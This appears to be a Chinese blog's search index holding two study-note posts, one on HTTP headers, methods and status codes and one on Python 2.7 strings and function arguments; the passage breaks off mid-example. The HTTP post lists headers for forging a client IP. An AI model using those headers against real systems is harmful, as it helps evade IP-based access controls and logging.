<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[WEB-HTTP基础]]></title>
      <url>/2018/01/30/WEB-HTTP%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<p>— 从零开始的笔记 —<br>— HTTP基础知识 —<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>emmm…终于系统地整理了一下经常看到但是没有去好好了解的HTTP的东西，那么开始。</p>
<h2 id="HTTP结构"><a href="#HTTP结构" class="headerlink" title="HTTP结构"></a>HTTP结构</h2><p><strong>请求结构</strong>：<br><img src="http://ww4.sinaimg.cn/large/006iKNp3ly1fnyr3e08oej30hs0a0t9n.jpg" alt=""><br>HTTP版本有两种：1.0 和 1.1<br>我们需要注意到的差异是 1.1版本请求必须使用HOST请求消息头</p>
<p><strong>响应结构</strong>：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3ly1fnyr3vkg2ej30hs0b2wfo.jpg" alt=""></p>
<h2 id="常用HTTP消息头部"><a href="#常用HTTP消息头部" class="headerlink" title="常用HTTP消息头部"></a>常用HTTP消息头部</h2><p>先给出一些通用的消息头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Connection：HTTP传输后是关闭TCP链接，还是保持链接开放</div><div class="line">Content-Length：消息主体字节长度</div><div class="line">Content-Type：消息主体内容类型；HTML文档内容类型为text/html</div><div class="line">Content-Encoding：为消息主体内容指定编码形式（如gzip）；一些应用使用它来压缩主体，以加快传输速度</div><div class="line">Transfer-Encoding：为方便通过HTTP传输而对消息主体使用的任何编码。使用这个消息头，通常用它指定块编码</div></pre></td></tr></table></figure></p>
<h2 id="HTTP请求消息头部"><a href="#HTTP请求消息头部" class="headerlink" title="HTTP请求消息头部"></a>HTTP请求消息头部</h2><p>下面开始说明HTTP请求消息部分，先从消息头部开始：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">User-Agent:UA,用户代理，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</div><div class="line">Referer：表示发出请求的原始URL，跳转</div><div class="line">Host：想访问的WEB服务器的域名/IP 地址和端口号</div><div class="line">Accept：客户端可以处理的媒体类型，按优先级排序；在一个以逗号为分隔的列表中，可以定义多种类型和使用通配符。</div><div class="line">Accept-Charset：客户端接收的字符集</div><div class="line">Accept-Encoding: 客户端愿意接受哪些内容编码</div><div class="line">Authorization：用于为一种内置HTTP身份验证向服务器提交证书</div><div class="line">Cookie：提交服务器向客户端发布的其他参数</div><div class="line">If-Modified-Since:用于说明浏览器最后一收到所请求的资源的时间。如果服务器判断资源没有发生变化，就会发送状态码304响应，是客户端使用缓存的资源副本</div><div class="line">If-None-Match：指定一个实体标签——消息主体内容的标识符；服务器可以使用实体标签确定浏览器是否使用资源的缓冲副本</div></pre></td></tr></table></figure></p>
<h3 id="User-Agent延伸"><a href="#User-Agent延伸" class="headerlink" title="User-Agent延伸"></a>User-Agent延伸</h3><p><a href="http://blog.csdn.net/u012175089/article/details/61199238" target="_blank" rel="external">补充参考1</a> <a href="http://blog.csdn.net/bone_ace/article/details/52476016" target="_blank" rel="external">补充参考2</a><br>IOS6系统格式：<br><code>User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25</code><br>safari5.1–Windows格式：<br><code>User-Agent: Mozilla/5.0(Windows;U;WindowsNT6.1;en-us)AppleWebKit/534.50(KHTML,likeGecko)Version/5.1Safari/534.50</code></p>
<h3 id="伪造IP的HTTP请求头："><a href="#伪造IP的HTTP请求头：" class="headerlink" title="伪造IP的HTTP请求头："></a>伪造IP的HTTP请求头：</h3><p>X-Forwarded-For<br>Client-IP<br>x-remote-IP<br>x-originating-IP<br>x-remote-addr</p>
<h2 id="HTTP请求头方法"><a href="#HTTP请求头方法" class="headerlink" title="HTTP请求头方法"></a>HTTP请求头方法</h2><pre><code>GET：获取资源，
POST：传输实体内容，之后细说
PUT：上传文件，传输文件到请求URL的位置。自身不带验证机制，存在安全性问题，需要关注。
DELETE：删除文件，删除请求URL位置的文件，与上同
HEAD：返回和GET一样的头，不返回主体；用于检查某一资源是否存在
TRACE：返回服务器接受到的请求头；用于检测客户端与服务器之间是否存在任何操纵请求的代理服务器
    有Max-Forward首字段：可以控制生存时间STEP
CONNECT：链接至HTTP代理服务器，[详细说明](http://blog.csdn.net/kobejayandy/article/details/24606521)
OPTIONS：返回服务器对特定资源可用的HTTP方法
</code></pre><h3 id="POST方法的Content-Type的四种形式"><a href="#POST方法的Content-Type的四种形式" class="headerlink" title="POST方法的Content-Type的四种形式"></a>POST方法的Content-Type的四种形式</h3><p>通过HTNL的Form表单的Enctype属性指定使用的四种形式<br>application/x-www-form-urlencoded<br>multipart/form-data<br>application/json<br>text/xml</p>
<h4 id="application-x-www-form-urlencoded-："><a href="#application-x-www-form-urlencoded-：" class="headerlink" title="application/x-www-form-urlencoded ："></a>application/x-www-form-urlencoded ：</h4><p>数据被编码为名称/值对</p>
<pre><code>POST http://www.example.com HTTP/1.1
Content-Type: application/x-www-form-urlencoded;charset=utf-8

title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3 
</code></pre><h4 id="multipart-form-data-："><a href="#multipart-form-data-：" class="headerlink" title="multipart/form-data ："></a>multipart/form-data ：</h4><p>可以使一块内容进行不同的编码形式<br>格式：Content-Type:multipart/form-data; boundary=（+随机的分割字符串）</p>
<pre><code>POST http://www.example.com HTTP/1.1
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA

------WebKitFormBoundaryrGKCBY7qhFd3TrwA
Content-Disposition: form-data; name=&quot;text&quot;

title
------WebKitFormBoundaryrGKCBY7qhFd3TrwA
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot;
Content-Type: image/png

PNG ... content of chrome.png ...
------WebKitFormBoundaryrGKCBY7qhFd3TrwA-- 
</code></pre><h4 id="application-json-："><a href="#application-json-：" class="headerlink" title="application/json ："></a>application/json ：</h4><p>主体是序列化后的 JSON 字符串</p>
<pre><code>POST http://www.example.com HTTP/1.1
Content-Type: application/json;charset=utf-8

{&quot;title&quot;:&quot;test&quot;,&quot;sub&quot;:[1,2,3]} 
</code></pre><h4 id="text-xml-："><a href="#text-xml-：" class="headerlink" title="text/xml ："></a>text/xml ：</h4><p>以纯文本形式进行编码，其中不含任何控件或格式字符。 </p>
<pre><code>POST http://www.example.com HTTP/1.1
Content-Type: text/xml

&lt;!--?xml version=&quot;1.0&quot;?--&gt;
&lt;methodcall&gt;
    &lt;methodname&gt;examples.getStateName&lt;/methodname&gt;
    &lt;params&gt;
        &lt;param&gt;
            &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt;

    &lt;/params&gt;
&lt;/methodcall&gt; 
</code></pre><h2 id="HTTP响应消息头部"><a href="#HTTP响应消息头部" class="headerlink" title="HTTP响应消息头部"></a>HTTP响应消息头部</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Server：指明WEB服务器软件</div><div class="line">Set-Cookie：发送一个cookie，分号分割，它将在随后向服务器发送的请求汇总由Cookie消息头返回</div><div class="line">	可选属性：</div><div class="line">	expires：设定cookie有效时间。使浏览器将cookie保存在永久性的存储器中，在随后的的浏览器会话中重复利用，直到到期。</div><div class="line">	domain：用于指定cookie有效域。这个域必须和收到cookie的域相同或者是它的父域</div><div class="line">	path：用于指定cookie的有效url路径</div><div class="line">	secure：设置，仅仅只在HTTPS请求中提交cookie</div><div class="line">	HttpOnly：无法通过客户端JS直接访问cookie</div><div class="line">Pragma：主要用于no-cache，浏览器不要将响应保存在缓存中</div><div class="line">Cache-Control：设置是否要缓存，及缓存的设置</div><div class="line">Expired：WEB服务器表明该实体将在什么时候过期</div><div class="line">ETag：指定一个实体标签，标志为实体的版本</div><div class="line">Location：服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。</div></pre></td></tr></table></figure>
<h2 id="HTTP响应返回状态码"><a href="#HTTP响应返回状态码" class="headerlink" title="HTTP响应返回状态码"></a>HTTP响应返回状态码</h2><ul>
<li>1XX——提供信息</li>
<li>2XX——请求被成功提交</li>
<li>3XX——客户端被重定向到其他资源</li>
<li>4XX——请求包含某种错误</li>
<li>5XX——服务器执行请求是遇到错误</li>
</ul>
<pre><code>100 Continue——当客户端发送包含主体的请求，服务端返回100，表示已经收到请求消息头，让客户端继续发送主体。

200 OK——已经成功提交请求，且响应主体中包含请求的结果。
201 Created——PUT请求的响应返回状态码，表示请求已成功提交

301 Moved Permanently——重定向到Location消息头中指定的URL，以后客户端应用新的URL替换原始的URL
302 Found——暂时重定向到Location消息头中指定的URL，随后请求中恢复使用原始URL
304 Not Modified——指示浏览器使用缓存中保存的所请求资源的副本。

400 Bad Request——表示客户端提交了一个无效的HTTP请求。
401 Unauthorized——服务器在许可请求前要求HTTP进行身份验证。身份验证类型在消息头WWW-Authenticate中说明
403 Forbidden——不管是否通过身份验证，禁止任何人访问被请求的资源
404 Not Found——所请求的资源不存在
405 Method Not Allowed——URL不支持请求中使用的方法，如不支持PUT
413 Request Entity Too Large——表示请求主体过长，服务器无法处理
414 Request URI Too long——表示请求中URL过长，服务器无法处理

500 InternalServer Error——表示服务器在执行请求时遇到错误。
503 Service Unavailable——尽管WEB服务器运转正常，能够响应请求，但是服务器访问的应用程序无法做出响应。
</code></pre><h2 id="HTTP身份验证"><a href="#HTTP身份验证" class="headerlink" title="HTTP身份验证"></a>HTTP身份验证</h2><p>在组织内部经常使用来访问内联网服务，但因特网上的Web应用程序很少使用</p>
<ul>
<li><strong>Basic</strong>： 在请求消息头中，用户证书以Base64的形式编码发送服务器</li>
<li><strong>NTLM</strong>：  质询-响应式机制，使用某个windows NTLM协议版本</li>
<li><strong>Digest</strong>： 质询-响应式机制，随同用户证书一起使用一个随机值MD5校验和。</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python2.7笔记]]></title>
      <url>/2018/01/25/python%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>……好好学习了下python2.7.放笔记放笔记<br><a id="more"></a></p>
<h2 id="输入输出及NULL"><a href="#输入输出及NULL" class="headerlink" title="输入输出及NULL"></a>输入输出及NULL</h2><p>输入  <code>raw_input(&quot;输入提示&quot;)</code><br>输出  <code>print</code><br>python的NULL <code>None</code></p>
<h2 id="函数导入"><a href="#函数导入" class="headerlink" title="函数导入"></a>函数导入</h2><p>4种导入方式<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pandas</div><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd <span class="comment">#重命名为pd</span></div><div class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> funtion1</div></pre></td></tr></table></figure></p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ul>
<li><strong>没有++ –</strong></li>
<li>算数运算符 + - <em> / % *</em> //(表示整数除法，/在3.0只能表示浮点数除法)</li>
<li>关系运算符 == != &lt; &gt; &lt;= &gt;= &lt;&gt;(在3.0已经被淘汰 )</li>
<li>逻辑运算符 and or not (没有|| &amp;&amp;)</li>
<li>位运算符    &amp; | ^ ~ &lt;&lt; &gt;&gt;</li>
<li>成员运算符 in  not in (判断是否包含)</li>
<li>身份运算符 is  not is (判断地址是否相同)</li>
</ul>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="数字变量"><a href="#数字变量" class="headerlink" title="数字变量"></a>数字变量</h3><p>类型：<strong>int long bool float complex(复数)</strong><br>long 不固定长度，受限于虚拟内存</p>
<h3 id="字符串变量"><a href="#字符串变量" class="headerlink" title="字符串变量"></a>字符串变量</h3><p>表现形式：<strong>‘str’ ‘’str’’ ‘’’str’’’</strong><br>三引号可以保留字符串中的所有格式信息<br>字符串加 <strong>r</strong>或<strong>R</strong> 前缀表示不使用转义字符而是原生字符</p>
<h2 id="字符串运算、索引、切片"><a href="#字符串运算、索引、切片" class="headerlink" title="字符串运算、索引、切片"></a>字符串运算、索引、切片</h2><h3 id="字符串运算"><a href="#字符串运算" class="headerlink" title="字符串运算"></a>字符串运算</h3><p>str1+str2 拼接字符串<br>str*3 重复字符串<br>str in string 判断包含</p>
<h3 id="字符串索引"><a href="#字符串索引" class="headerlink" title="字符串索引"></a>字符串索引</h3><p>从0开始，从前向后; str[0] 第一个字符<br>从-1开始，从后向前; str[-1] 倒数第一个字符</p>
<h3 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h3><p><strong>str[start:finish:countby]</strong> ———— 左闭右开<br>start: 切片开始位置，包括start索引对应字符（不设置，默认第一个字符）<br>finish: 切片结束位置，不包括end索引对应字符（不设置，默认最大索引+1）<br>countby：计数参数，若为2，隔一个字符取一个字符；若为-1，获得逆序输出（不设置，默认为1）ps.对于前两者参数有要求，start索引位置要位于end后，且符号相同</p>
<h2 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h2><ul>
<li><strong>dir(变量类型)</strong><br>  查看该变量类型所有方法</li>
<li><a href="http://www.runoob.com/python/att-string-replace.html" target="_blank" rel="external">str.replace(old,new)</a><br>  生成一个新的字符串，用new替换所有old;可设定替换次数：max</li>
<li><a href="http://www.runoob.com/python/att-string-find.html" target="_blank" rel="external">str.find(str)</a><br>  返回第一次出现子串的下标，找不到则返回-1;可设定查找范围：beg，end</li>
<li><strong>str.isdigit()</strong><br>  字符串是否包含数字，ture，false</li>
<li><a href="http://www.runoob.com/python/att-string-count.html" target="_blank" rel="external">str.count(sub,start=0,end=len(string))</a><br>  统计字符串内子串出现的次数；可以设定范围;左闭右开，len(string) != -1;</li>
<li><strong>str.strip()</strong><br>  去掉字符串开始和结尾的空格回车;可设定自定义字符串sub,移除字符串中字符</li>
<li><a href="http://www.runoob.com/python/att-string-split.html" target="_blank" rel="external"><strong>str.split()</strong></a><br>  str.split(分隔符，分割次数)<br>  返回分割后的字符串列表，分隔符默认是所有空格（空格、换行、制表符等）</li>
<li><strong>str.title()</strong><br>  生成一个新的字符串,所有单词首字母大写其他字母小写</li>
<li><strong>str.capitalize()</strong><br>  生成一个新的字符串,首字母大写其余小写（只有第一个字母）</li>
<li><strong>str.upper()</strong><br>  生成一个新的字符串,全部大写</li>
<li><strong>str.lower()</strong><br>  生成一个新的字符串,全部小写</li>
</ul>
<h2 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h2><p>字符串格式化输出 有两种方法：str.format()函数和类似C语言的%形式</p>
<h3 id="str-format"><a href="#str-format" class="headerlink" title="str.format()"></a><strong>str.format()</strong></h3><p>利用 <strong>{} :</strong> 两个符号格式化字符串：<strong>{}</strong>设定参数位置, <strong>:</strong>设定参数格式<br><strong>{}</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">1.通过位置设定参数，可多次使用位置</div><div class="line">    &apos;&#123;1&#125;&#123;0&#125;&#123;1&#125;&apos;.format(1,2)  ==&gt; &apos;212&apos;</div><div class="line">    使用列表</div><div class="line">    &gt;&gt;&gt; li = [&apos;hoho&apos;,18]</div><div class="line">        &apos;my name is &#123;&#125; ,age &#123;&#125;&apos;.format(*li)</div><div class="line">        &apos;my name is hoho ,age 18&apos;</div><div class="line">2.通过关键词设定参数（关键词不能为数字）</div><div class="line">    &apos;&#123;name&#125;&#123;id&#125;&apos;.format(id=&apos;1&apos;,name=&apos;2&apos;) ===&gt; &apos;21&apos;</div><div class="line">    使用字典</div><div class="line">    &gt;&gt;&gt; hash = &#123;&apos;name&apos;:&apos;hoho&apos;,&apos;age&apos;:18&#125;</div><div class="line">        &apos;my name is &#123;name&#125;,age is &#123;age&#125;&apos;.format(**hash)</div><div class="line">        &apos;my name is hoho,age is 18&apos;</div></pre></td></tr></table></figure></p>
<p><strong>:</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.填充与对齐</div><div class="line">    **&#123;:(填充字符)(对齐方式)(宽度)&#125;**</div><div class="line">    填充字符： 只能指定一个字符，不指定的话默认使用空格</div><div class="line">    对齐方式： ^ &lt; &gt; 分别是 居中，左对齐，右对齐</div><div class="line">    宽度： 总宽度;（宽度奇数，居中偏左；宽度过小，不填充）</div><div class="line">    `&apos;&#123;:*&gt;8&#125;&apos;.format(&apos;2015&apos;)`</div><div class="line">2.精度与类型</div><div class="line">    **&#123;:(.精度长度)f&#125;**</div><div class="line">    .(精度长度): 长度为X的精度(4舍5入) 只能与f一起用</div><div class="line">    类型：f(float) </div><div class="line">    `&apos;&#123;:.2f&#125;&apos;.format(3.12342)`</div><div class="line">    **&#123;:(类型)&#125;**</div><div class="line">    b(二进制) o(八进制) d(十进制) x(十六进制) float类型无法用b 0 d x 表示</div><div class="line">    ,(金额的千位分隔符) float类型留一位小数</div><div class="line">    `&apos;&#123;:d&#125;.format(2015)&apos;`</div><div class="line">结合：`&apos;&#123;:0&gt;8.2f&#125;&apos;.format(0.33)`</div></pre></td></tr></table></figure></p>
<h3 id="“”"><a href="#“”" class="headerlink" title="“” % ( )"></a>“” % ( )</h3><p>另一种格式化字符串方法<br>例子<br><code>&quot;abc %s&quot; % (&#39;abc&#39;)</code><br>格式符——控制位置和格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">%%    字符&quot;%&quot;</div><div class="line">%s    字符串 (采用str()的显示)</div><div class="line">%r    字符串 (采用repr()的显示)</div><div class="line">%c    单个字符</div><div class="line">%b    二进制整数</div><div class="line">%d    十进制整数</div><div class="line">%i    十进制整数</div><div class="line">%o    八进制整数</div><div class="line">%x    十六进制整数</div><div class="line">%e    指数 (基底写为e)</div><div class="line">%E    指数 (基底写为E)</div><div class="line">%f    浮点数</div><div class="line">%F    浮点数，与上相同</div><div class="line">%g    指数(e)或浮点数 (根据显示长度)</div><div class="line">%G    指数(E)或浮点数 (根据显示长度)</div></pre></td></tr></table></figure></p>
<p>添加格式控制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">%[(name)][flags][width].[precision]类型</div><div class="line">(name)为命名</div><div class="line">flags：可以有**-,&apos; &apos;或0**。</div><div class="line">    不填写flags表示右对齐。</div><div class="line">    **-**：表示左对齐。</div><div class="line">    **&apos; &apos;**：为一个空格，表示在正数的左侧填充一个空格，从而与负数对齐。</div><div class="line">    **0**：表示使用0填充。</div><div class="line">width：表示显示宽度，可以用*代替，在%后面作为参数填充</div><div class="line">precision：表示小数点后精度，可以用*代替，在%后面作为参数填充</div></pre></td></tr></table></figure></p>
<h2 id="类型转换函数"><a href="#类型转换函数" class="headerlink" title="类型转换函数"></a>类型转换函数</h2><p>字符与整数的转换（一个字符与ascii码）<br>字符转整数：ord()<br>整数转字符：chr()</p>
<h2 id="python2-x关键词"><a href="#python2-x关键词" class="headerlink" title="python2.x关键词"></a>python2.x关键词</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">and del from not while as</div><div class="line">elif global or with assert</div><div class="line">else if pass yield break </div><div class="line">except import print class exec</div><div class="line">in raise continue finally is</div><div class="line">return def for lambda try</div></pre></td></tr></table></figure>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>函数的参数可以设置默认值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span>:</span></div><div class="line">    <span class="keyword">print</span> a,b,c</div><div class="line">test()        <span class="comment"># 123</span></div></pre></td></tr></table></figure></p>
<p>4种静态函数调用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf8</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(a,b,c)</span>:</span></div><div class="line">    <span class="keyword">print</span> a,b,c</div><div class="line"><span class="comment">#元组x</span></div><div class="line">x = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</div><div class="line"><span class="comment">#字典xx</span></div><div class="line">xx=&#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="number">2</span>,<span class="string">'c'</span>:<span class="number">3</span>&#125;</div><div class="line"></div><div class="line">test(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)       <span class="comment">#123</span></div><div class="line">test(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>) <span class="comment">#123 abc为函数变量，填错报错</span></div><div class="line">test(*x)          <span class="comment">#123 元组转变，相当于式子1 ； list列表也可</span></div><div class="line">test(**xx)        <span class="comment">#123 字典转变，相当于式子2</span></div></pre></td></tr></table></figure></p>
<p>2种动态参数调用<br>*arg<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf8</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">(*args)</span>:</span></div><div class="line">    <span class="keyword">print</span> type(args)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> args:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line"></div><div class="line">test2(<span class="number">1</span>)</div><div class="line">test2(<span class="number">1</span>,<span class="string">'a'</span>,<span class="keyword">None</span>)</div><div class="line">a=(<span class="number">1</span>,<span class="string">'a'</span>,<span class="keyword">None</span>)</div><div class="line">test2(*a)</div><div class="line"><span class="comment"># &lt;type 'tuple'&gt;</span></div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment"># &lt;type 'tuple'&gt;</span></div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment"># a</span></div><div class="line"><span class="comment"># None</span></div><div class="line"><span class="comment"># &lt;type 'tuple'&gt;</span></div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment"># a</span></div><div class="line"><span class="comment"># None</span></div></pre></td></tr></table></figure></p>
<p>**arg<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf8</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test3</span><span class="params">(**args)</span>:</span></div><div class="line">    <span class="keyword">print</span> type(args)</div><div class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> args.items():</div><div class="line">        <span class="keyword">print</span> k,v</div><div class="line">dic=&#123;<span class="string">'k1'</span>:<span class="number">1</span>,<span class="string">'k2'</span>:<span class="string">'a'</span>&#125;</div><div class="line">test3(k1=<span class="number">1</span>)</div><div class="line">test3(k1=<span class="number">1</span>,k2=<span class="string">'a'</span>)</div><div class="line">test3(**dic)</div><div class="line"><span class="comment"># &lt;type 'dict'&gt;</span></div><div class="line"><span class="comment"># k1 1</span></div><div class="line"><span class="comment"># &lt;type 'dict'&gt;</span></div><div class="line"><span class="comment"># k2 a</span></div><div class="line"><span class="comment"># k1 1</span></div><div class="line"><span class="comment"># &lt;type 'dict'&gt;</span></div><div class="line"><span class="comment"># k2 a</span></div><div class="line"><span class="comment"># k1 1</span></div></pre></td></tr></table></figure></p>
<p>两种动态参数混用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test4</span><span class="params">(*arg1,**arg2)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg1:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> arg2.items():</div><div class="line">        <span class="keyword">print</span> k,v</div><div class="line">test4(<span class="number">1</span>)</div><div class="line">test4(k1=<span class="number">1</span>)</div><div class="line">test4(<span class="number">100</span>,<span class="number">200</span>,k3=<span class="keyword">True</span>)</div><div class="line">a=(<span class="number">100</span>,<span class="number">200</span>)</div><div class="line">b=&#123;<span class="string">'k3'</span>:<span class="keyword">True</span>&#125;</div><div class="line">test4(a,b)</div><div class="line">test4(*a,**b)</div><div class="line"><span class="comment"># 1</span></div><div class="line"></div><div class="line"><span class="comment"># k1 1</span></div><div class="line"></div><div class="line"><span class="comment"># 100</span></div><div class="line"><span class="comment"># 200</span></div><div class="line"><span class="comment"># k3 True</span></div><div class="line"><span class="comment">####下一个输出结果：a,b 被*arg1编成元组 ((100, 200), &#123;'k3': True&#125;)</span></div><div class="line"><span class="comment">####都在第一个for中输出</span></div><div class="line"><span class="comment"># (100, 200)</span></div><div class="line"><span class="comment"># &#123;'k3': True&#125;</span></div><div class="line"></div><div class="line"><span class="comment"># 100</span></div><div class="line"><span class="comment"># 200</span></div><div class="line"><span class="comment"># k3 True</span></div></pre></td></tr></table></figure></p>
<p>静态动态混用<br><em>arg1 *</em>arg2 可以不填参数，arg必须填<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test5</span><span class="params">(arg,*arg1,**arg2)</span>:</span></div><div class="line">    <span class="keyword">print</span> arg</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg1:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> arg2.items():</div><div class="line">        <span class="keyword">print</span> k,v</div><div class="line">a=(<span class="number">100</span>,<span class="number">200</span>)</div><div class="line">b=&#123;<span class="string">'k3'</span>:<span class="keyword">True</span>&#125;</div><div class="line">test5(<span class="number">1</span>)</div><div class="line">test5(<span class="number">1</span>,*a,**b)</div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment"># 100</span></div><div class="line"><span class="comment"># 200</span></div><div class="line"><span class="comment"># 